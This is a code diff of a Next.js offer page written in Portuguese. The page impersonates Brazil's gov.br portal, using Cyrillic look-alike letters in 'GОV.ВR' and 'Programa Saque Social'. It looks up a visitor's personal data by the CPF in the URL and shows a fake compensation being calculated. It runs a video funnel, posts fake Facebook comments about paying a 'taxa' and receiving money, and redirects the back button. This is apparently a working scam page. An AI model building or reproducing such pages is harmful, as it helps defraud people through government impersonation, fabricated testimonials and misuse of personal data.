@@ -5,7 +5,6 @@ import React, { useState, useEffect, useRef, Suspense } from 'react';
 import Head from 'next/head';
 import Image from 'next/image';
 import { useRouter, useSearchParams } from 'next/navigation';
-// import Plyr from 'plyr-react'; // Original import causing SSR issues
 import 'plyr-react/plyr.css';
 import type PlyrInstance from 'plyr'; // Import PlyrInstance type
 import '../offer-page.css'; // Styles specific to this offer page
@@ -16,7 +15,6 @@ import dynamic from 'next/dynamic';
 
 const Plyr = dynamic(() => import('plyr-react'), {
   ssr: false,
-  // You can add a loading component here if you want:
   // loading: () => <p>Carregando player...</p>
 });
 
@@ -52,10 +50,9 @@ function OfferContent() {
   const playerRef = useRef<PlyrInstance | null>(null);
   const videoUrl = "https://225412.b-cdn.net/Video%20Page.mp4";
 
-  const [loading, setLoading] = useState(true);
-  const [showMainContent, setShowMainContent] = useState(false); // To show content after data fetch
+  const [pageLoading, setPageLoading] = useState(true); // Renamed from 'loading' to avoid conflict
+  const [showMainContent, setShowMainContent] = useState(false); 
   
-  // Video and UI states
   const [progress, setProgress] = useState(0);
   const [showThumbnailOverlay, setShowThumbnailOverlay] = useState(true);
   const [showResgateOverlay, setShowResgateOverlay] = useState(false);
@@ -68,6 +65,7 @@ function OfferContent() {
   const [userData, setUserData] = useState<UserData | null>(null);
   const [headerUserName, setHeaderUserName] = useState('Usuáriо');
   const [statusMessage, setStatusMessage] = useState("Sua indenização está sendo calculada...");
+  const [fetchError, setFetchError] = useState<string | null>(null);
 
 
   const [comments, setComments] = useState<Comment[]>([]);
@@ -81,7 +79,6 @@ function OfferContent() {
 
   const chatBodyRef = useRef<HTMLDivElement>(null);
 
-  // Back button redirect logic
   useEffect(() => {
     const urlBackRedirect = '../back/index.html'; 
     const trimmedUrlBackRedirect = urlBackRedirect.trim() +
@@ -100,7 +97,6 @@ function OfferContent() {
     return () => window.removeEventListener('popstate', handlePopState);
   }, []);
   
-  // Restore state from localStorage
   useEffect(() => {
     const storedState = localStorage.getItem('offerPageState');
     if (storedState) {
@@ -111,15 +107,12 @@ function OfferContent() {
         if (state.videoStarted) setVideoStarted(state.videoStarted);
         if (state.videoCompleted) {
             setVideoCompleted(state.videoCompleted);
-            finalizeProgressAppearance(); // Reflect UI changes if video was completed
+            finalizeProgressAppearance(); 
         }
         if (state.progressEnabled) setProgressEnabled(state.progressEnabled);
-        // Thumbnail might not need restoring if videoStarted handles it
         if (state.videoStarted && !state.videoCompleted) {
-            setShowThumbnailOverlay(false); // If video started but not completed, hide thumbnail
+            setShowThumbnailOverlay(false); 
         }
-
-
       } catch (e) {
         console.error("Failed to parse stored state:", e);
         localStorage.removeItem('offerPageState');
@@ -127,7 +120,6 @@ function OfferContent() {
     }
   }, []);
 
-  // Store state to localStorage
   useEffect(() => {
     const stateToStore = {
       chaveEnviada,
@@ -167,28 +159,40 @@ function OfferContent() {
   useEffect(() => {
     async function fetchAndSetUserData() {
       if (!initialCpf) {
-        setLoading(false);
+        setPageLoading(false);
         setShowMainContent(true); 
+        setFetchError("CPF não encontrado nos parâmetros da URL.");
         console.warn("CPF not found in query params.");
         return;
       }
       
+      setPageLoading(true);
+      setFetchError(null);
       try {
-        const cleanCPF = initialCpf.replace(/\D/g, '');
-        const response = await fetch(`https://proxy-a.vercel.app/api/proxy?cpf=${cleanCPF}`);
-        if (!response.ok) throw new Error('Failed to fetch user data');
+        // Use a relative path to call your internal API route
+        const response = await fetch(`/api/userData?cpf=${initialCpf}`); 
+        
+        if (!response.ok) {
+          const errorData = await response.json().catch(() => ({ error: "Erro desconhecido ao processar resposta da API interna" }));
+          console.error("Erro da API interna:", response.status, errorData);
+          throw new Error(errorData.error || `Falha ao buscar dados do usuário. Status: ${response.status}`);
+        }
         const data = await response.json();
         
         if (data.dadosBasicos) {
           setUserData(data.dadosBasicos);
           setHeaderUserName(formatFullName(data.dadosBasicos.nome).split(' ')[0] || 'Usuáriо');
+        } else if (data.error) {
+          console.error("Erro retornado pela API interna:", data.error, data.details);
+          throw new Error(data.error || "Formato de dados do usuário incorreto ou erro da API.");
         } else {
-          throw new Error('User data format incorrect');
+          throw new Error('Formato de dados do usuário incorreto.');
         }
-      } catch (err) {
-        console.error("Error fetching user data:", err);
+      } catch (err: any) {
+        console.error("Erro ao buscar dados do usuário pela API interna:", err);
+        setFetchError(err.message || "Ocorreu um erro ao buscar seus dados.");
       } finally {
-        setLoading(false);
+        setPageLoading(false);
         setShowMainContent(true);
       }
     }
@@ -203,7 +207,6 @@ function OfferContent() {
     }
   };
 
-  // Chat Logic
   const scrollChatToBottom = () => {
     if (chatBodyRef.current) {
       chatBodyRef.current.scrollTop = chatBodyRef.current.scrollHeight;
@@ -260,7 +263,6 @@ function OfferContent() {
     }
   };
   
-  // Video Player Logic
   const handleThumbnailClick = () => {
     if (playerRef.current?.plyr) {
       playerRef.current.plyr.muted = false;
@@ -300,7 +302,7 @@ function OfferContent() {
         if (!videoStarted && !videoCompleted && progressEnabled) {
           setVideoStarted(true);
         } else if (videoCompleted) {
-          plyr.pause(); // Prevent replay if already completed
+          plyr.pause(); 
         }
       };
       const onEnded = () => {
@@ -311,15 +313,13 @@ function OfferContent() {
       plyr.on('play', onPlay);
       plyr.on('ended', onEnded);
 
-      // If video was already completed (e.g. from localStorage), show relevant UI
       if (videoCompleted) {
         finalizeProgressAppearance();
         setShowThumbnailOverlay(false);
-      } else if (videoStarted) { // If started but not completed
+      } else if (videoStarted) { 
         setShowThumbnailOverlay(false);
-        setProgressEnabled(true); // Ensure progress bar updates
+        setProgressEnabled(true); 
       }
-
 
       return () => {
         plyr.off('timeupdate', onTimeUpdate);
@@ -330,7 +330,6 @@ function OfferContent() {
   }, [progressEnabled, videoCompleted, videoStarted, playerRef.current]);
 
 
-  // Fake Facebook Comments Logic
   useEffect(() => {
     const fetchRandomUser = async () => {
       try {
@@ -358,11 +357,9 @@ function OfferContent() {
     };
     
     const initialTexts = ["Tive medo, mas entrou R$ 2.400!", "Tive que pagar taxa, mas veio R$ 2.800 em 10min", "Recebi R$ 4.000 deu para pagar as contas kkk"];
-    // Only generate initial comments if comments array is empty (e.g. first load)
     if (comments.length === 0) {
         initialTexts.forEach(text => createNewComment(text));
     }
-
 
     const commentInterval = setInterval(() => {
       const messages = [
@@ -378,10 +375,10 @@ function OfferContent() {
     }, 10000); 
 
     return () => clearInterval(commentInterval);
-  }, []); // Rerun if comments changes to avoid duplicate initial comments if logic is flawed. Better: check comments.length
+  }, []); 
 
 
-  if (loading) {
+  if (pageLoading) {
     return (
       <div id="loading-screen">
         <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45">
@@ -399,7 +396,6 @@ function OfferContent() {
     <>
       <Head>
         <title>Рrоgrаmа Sаquе Sосiаl - Oferta</title>
-         {/* Add any global preloads/dns-prefetch if needed for Plyr or video source if not handled by Plyr itself */}
       </Head>
       <div className="offer-page-body">
         <header className="offer-page-header">
@@ -432,6 +428,12 @@ function OfferContent() {
 
         {showMainContent && (
           <main id="main-content">
+            {fetchError && (
+                <div className="error-message-box">
+                    <p>Erro ao carregar dados: {fetchError}</p>
+                    <p>Por favor, tente recarregar a página ou verifique sua conexão.</p>
+                </div>
+            )}
             <div className="progress-container">
               <div className="progress-bar" style={{ width: `${progress}%` }}></div>
             </div>
@@ -443,11 +445,11 @@ function OfferContent() {
                     sources: [{ src: videoUrl, provider: 'html5' }],
                   }}
                   options={{
-                    controls: [], // No default controls
+                    controls: [], 
                     hideControls: true,
-                    clickToPlay: false, // Handled by thumbnail
-                    autoplay: false, // Start muted, autoplay handled by thumbnail click
-                    muted: true, // Start muted
+                    clickToPlay: false, 
+                    autoplay: false, 
+                    muted: true, 
                     playsinline: true,
                   }}
                 />
@@ -574,12 +576,20 @@ function OfferContent() {
   );
 }
 
-
 export default function OfferPage() {
   return (
-    <Suspense fallback={<div id="loading-screen" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff'}}> <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45"> <title>GОV.ВR</title> <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif"> <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan> <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan> </text> </svg> </div>}>
+    <Suspense fallback={
+      <div id="loading-screen" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff'}}> 
+        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45"> 
+          <title>GОV.ВR</title> 
+          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif"> 
+            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan> 
+            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan> 
+          </text> 
+        </svg> 
+      </div>
+    }>
       <OfferContent />
     </Suspense>
   );
 }
-
